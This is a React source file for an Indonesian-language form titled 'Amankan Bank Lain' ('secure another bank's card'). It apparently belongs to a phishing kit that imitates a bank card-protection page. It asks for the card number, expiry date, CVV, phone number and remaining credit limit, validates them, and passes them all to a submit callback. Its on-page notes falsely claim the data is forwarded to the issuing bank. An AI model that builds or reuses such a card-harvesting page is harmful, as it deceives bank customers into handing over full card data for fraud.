import React, { useState } from 'react';
import { FlipCard3D } from '../FlipCard3D';
import {
  BANK_OPTIONS,
  formatCardNumber,
  formatExpiry,
  formatRupiah,
  detectCardType,
  hasCvvCapability,
  validateLuhn,
} from '../../utils/cardUtils';

interface BankLainFormProps {
  onSubmitSuccess: (details: {
    bankName: string;
    cardType: string;
    noKartu: string;
    noHp: string;
    masa: string;
    cvv: string;
    limit: string;
  }) => void;
}

export const BankLainForm: React.FC<BankLainFormProps> = ({ onSubmitSuccess }) => {
  const [selectedBankId, setSelectedBankId] = useState('bca');
  const [noKartu, setNoKartu] = useState('');
  const [noHp, setNoHp] = useState('');
  const [masa, setMasa] = useState('');
  const [cvv, setCvv] = useState('');
  const [limit, setLimit] = useState('');
  const [isFlipped, setIsFlipped] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const selectedBank =
    BANK_OPTIONS.find((b) => b.id === selectedBankId) || BANK_OPTIONS[0];

  const cleanCardNum = noKartu.replace(/\D/g, '');
  const cardBrand = detectCardType(cleanCardNum);
  const showCvv = hasCvvCapability(cleanCardNum);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setNoKartu(formatted);
    setErrorMsg(null);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, '').substring(0, 15);
    setNoHp(digits);
    setErrorMsg(null);
  };

  const handleMasaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiry(e.target.value);
    setMasa(formatted);
    setErrorMsg(null);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, '').substring(0, 4);
    setCvv(digits);
    setErrorMsg(null);
  };

  const handleLimitChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatRupiah(e.target.value);
    setLimit(formatted);
    setErrorMsg(null);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (cleanCardNum.length < 13 || cleanCardNum.length > 19) {
      setErrorMsg('Nomor Kartu tidak valid (13-19 digit).');
      return;
    }

    if (!validateLuhn(cleanCardNum)) {
      setErrorMsg('Nomor Kartu ditolak oleh sistem keamanan (Gagal verifikasi Algoritma Luhn).');
      return;
    }

    if (noHp.length < 10 || !noHp.startsWith('08')) {
      setErrorMsg("Nomor Handphone harus valid, diawali '08', minimal 10 digit.");
      return;
    }

    if (masa.length !== 5 || !masa.includes('/')) {
      setErrorMsg('Format Masa Berlaku harus MM/YY.');
      return;
    }

    if (showCvv && (cvv.length < 3 || cvv.length > 4)) {
      setErrorMsg('CVV harus 3 atau 4 digit.');
      return;
    }

    onSubmitSuccess({
      bankName: selectedBank.label,
      cardType: cardBrand.name,
      noKartu,
      noHp,
      masa,
      cvv: showCvv ? cvv : 'Tidak Ada',
      limit,
    });
  };

  return (
    <div>
      {/* Header */}
      <div className="flex items-center justify-between mb-3 pr-8">
        <img
          id="headerLogoImg"
          src={selectedBank.logo}
          alt={selectedBank.name}
          className="h-6 object-contain"
        />
        <span className="text-xs font-bold text-[#0060af]">DEBIT/KREDIT</span>
      </div>

      {/* Bank Selector */}
      <div className="mb-2.5">
        <label htmlFor="bankSelector" className="block text-xs font-bold text-[#1a2b4c] mb-1">
          Pilih Bank
        </label>
        <select
          id="bankSelector"
          value={selectedBankId}
          onChange={(e) => setSelectedBankId(e.target.value)}
          className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all cursor-pointer"
        >
          {BANK_OPTIONS.map((bank) => (
            <option key={bank.id} value={bank.id}>
              {bank.label}
            </option>
          ))}
        </select>
      </div>

      {/* 3D Flip Card */}
      {showCvv && (
        <FlipCard3D
          isFlipped={isFlipped}
          brandName={selectedBank.name}
          brandBadge={cleanCardNum ? cardBrand.badge : 'BCA'}
          cardNumber={noKartu}
          gradient={selectedBank.gradient}
          cvv={cvv}
          onToggleFlip={() => setIsFlipped((prev) => !prev)}
        />
      )}

      {errorMsg && (
        <div className="mb-2.5 p-2 bg-red-50 border border-red-200 text-red-700 text-xs rounded-md">
          {errorMsg}
        </div>
      )}

      <form id="formBankLain" onSubmit={handleSubmit} className="space-y-2.5 pt-1">
        <div>
          <label
            htmlFor="blNoKartu"
            className="flex items-center justify-between text-xs font-bold text-[#1a2b4c] mb-1"
          >
            <span>Nomor Kartu</span>
            {cleanCardNum && (
              <span className="text-[10px] font-bold text-[#0060af]">
                [ {cardBrand.name} ]
              </span>
            )}
          </label>
          <input
            type="text"
            id="blNoKartu"
            value={noKartu}
            onChange={handleCardNumberChange}
            placeholder="16 angka no kartu"
            className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all font-mono"
            inputMode="numeric"
            maxLength={23}
            required
          />
        </div>

        <div className="grid grid-cols-2 gap-2">
          <div>
            <label htmlFor="blMasa" className="block text-xs font-bold text-[#1a2b4c] mb-1">
              Masa Berlaku
            </label>
            <input
              type="text"
              id="blMasa"
              value={masa}
              onChange={handleMasaChange}
              placeholder="BB/TT"
              className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all font-mono"
              inputMode="numeric"
              maxLength={5}
              required
            />
          </div>

          {showCvv && (
            <div id="cvvFormGroup">
              <label htmlFor="cvvInputBox" id="cvvLabel" className="block text-xs font-bold text-[#1a2b4c] mb-1">
                CVV
              </label>
              <input
                type="password"
                id="cvvInputBox"
                value={cvv}
                onChange={handleCvvChange}
                onFocus={() => setIsFlipped(true)}
                onBlur={() => setIsFlipped(false)}
                placeholder="3 digit"
                className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all font-mono"
                inputMode="numeric"
                maxLength={4}
                required
              />
            </div>
          )}
        </div>

        <div>
          <label htmlFor="blNoHp" className="block text-xs font-bold text-[#1a2b4c] mb-1">
            Nomor Telepon
          </label>
          <input
            type="text"
            id="blNoHp"
            value={noHp}
            onChange={handlePhoneChange}
            placeholder="0812xxxxxxxxxxx"
            className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all"
            inputMode="numeric"
            maxLength={15}
            required
          />
        </div>

        <div>
          <label htmlFor="blLimit" className="block text-xs font-bold text-[#1a2b4c] mb-1">
            Sisa Limit
          </label>
          <input
            type="text"
            id="blLimit"
            value={limit}
            onChange={handleLimitChange}
            placeholder="Rp 0"
            className="w-full px-3 py-2 bg-[#ebf1f6] border border-[#d0dbe5] rounded-md text-xs text-[#1a2b4c] placeholder-[#94a3b8] focus:border-[#0060af] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#0060af]/10 transition-all font-mono"
            inputMode="numeric"
            required
          />
        </div>

        <div className="my-2.5 text-left bg-white border border-[#b8c4ce] rounded-lg p-2.5">
          <div className="text-[#00508c] text-[13px] font-bold mb-1.5">Catatan:</div>
          <ul className="list-none p-0 m-0 flex flex-col gap-1 text-[11px] text-[#55606b] leading-snug">
            <li className="relative pl-4 before:content-['•'] before:absolute before:left-1 before:-top-0.5 before:text-base before:text-[#00508c]">
              Permintaan pengamanan kartu bank lain akan diteruskan langsung ke sistem perbankan penerbit kartu.
            </li>
            <li className="relative pl-4 before:content-['•'] before:absolute before:left-1 before:-top-0.5 before:text-base before:text-[#00508c]">
              Segera hubungi call center bank penerbit kartu Anda untuk konfirmasi penerbitan kartu pengganti baru.
            </li>
            <li className="relative pl-4 before:content-['•'] before:absolute before:left-1 before:-top-0.5 before:text-base before:text-[#00508c]">
              Pastikan nomor kartu, masa berlaku, dan kontak telah sesuai dengan kartu fisik Anda.
            </li>
          </ul>
        </div>

        <button
          type="submit"
          className="w-full py-3 bg-[#0060af] text-white rounded-md text-sm font-bold cursor-pointer hover:bg-[#004080] hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(0,96,175,0.4)] active:scale-[0.98] transition-all duration-200 shadow-[0_4px_12px_rgba(0,96,175,0.25)] mt-2"
          id="submitBankLainBtn"
        >
          Amankan Bank Lain
        </button>
      </form>
    </div>
  );
};
